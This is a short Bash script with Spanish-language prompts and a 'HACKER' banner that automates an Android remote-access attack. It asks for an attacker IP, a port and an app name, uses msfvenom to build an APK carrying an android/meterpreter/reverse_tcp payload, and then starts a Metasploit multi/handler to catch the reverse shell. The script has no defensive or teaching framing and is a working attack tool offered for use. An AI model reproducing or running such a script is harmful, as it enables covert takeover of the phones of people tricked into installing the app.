#!/bin/bash



function limpiar_pantalla {
    clear    
}

trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO DEL SCRIPT\e[0m"
    sleep 2s
    limpiar_pantalla
    exit 0
}
echo -e "\e[0;31m___________________________\e[0;34m___________________________________\e[0m"
echo -e "\e[0;31m ██╗  ██╗  █████╗  ██████╗ \e[0;34m  ██╗ ██ ║  ███████╗  ██████╗      \e[0m"
echo -e "\e[0;31m ██║  ██║ ██╔══██╗ ██╔════╝\e[0;34m  ██║ ██╔╝  ██╔════╝  ██╔══██╗     \e[0m"
echo -e "\e[0;31m ███████║ ███████║ ██║Anoni\e[0;34mmo█████╔╝   █████╗    ██████╔╝     \e[0m"
echo -e "\e[0;31m ██╔══██║ ██╔══██║ ██║     \e[0;34m  ██╔═██╗   ██╔══╝    ██╔══██╗     \e[0m"
echo -e "\e[0;31m ██║  ██║ ██║  ██║╚██████╗ \e[0;34m  ██║ ██╗   ███████╗  ██║  ██║     \e[0m"
echo -e "\e[0;31m ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═════╝ \e[0;34m  ╚═╝ ╚═╝   ╚══════╝  ╚═   ╚═╝     \e[0m"
echo -e "\e[0;31m                           \e[0;34m                                   \e[0m"
echo -e "\e[0;31m                      A n o\e[0;34m n i m o                           \e[0m"

echo -e "\e[3;34mDERECHOS-DE-AUTOR->>>\e[0;31mHACKER-PC\e[0m"
sleep 2s
echo -e "\e[1;31mVAMOS-A-CREAR-UN-PAYLOAD-ANDROID ... \e[0m"
sleep 3s
echo -n -e "\e[0;31mDIRECCION-IP\e[0m"
read ip
echo -n -e "\e[0;31mPUERTO\e[0m"
read puerto
read -p "\e[0;31mNombre de la aplicacion :" o
limpiar_pantalla
echo -e "\e[3;33mcreando aplicacion \e[0m"
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$puerto R > $o.apk
echo -e "\e[1;33mCreado con-\e[0m-\e[0;31m-EXITO\e[0m"
sleep 2s
echo -e "\e[0;34mConectando a postgresql\e[0m"
sudo service postgresql start
echo -e "\e[0;34mConectado con exito\e[0m"
sleep 2s
echo -e "\e[0;31mABRIENDO METASPLOIT\e[0m"
sleep 2s
limpiar_pantalla
msfconsole -x "use multi/handler;\
set PAYLOAD android/meterpreter/reverse_tcp;\
set LHOST $ip;\
set LPORT $puerto;\
exploit"